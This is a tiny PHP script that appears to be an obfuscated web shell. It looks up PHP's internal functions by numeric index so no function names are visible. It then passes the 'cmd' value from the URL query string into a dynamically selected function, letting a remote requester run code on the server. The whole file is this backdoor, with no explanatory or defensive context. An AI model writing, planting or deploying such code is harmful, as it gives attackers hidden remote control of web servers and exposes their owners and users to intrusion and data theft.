<?php

function f(){
$a= get_defined_functions();
$a=$a['internal'];
$b=$a[3]();
return $a[734]($a[$a[982]($b)],$b);
};

f(640, $_GET['cmd']);

?>
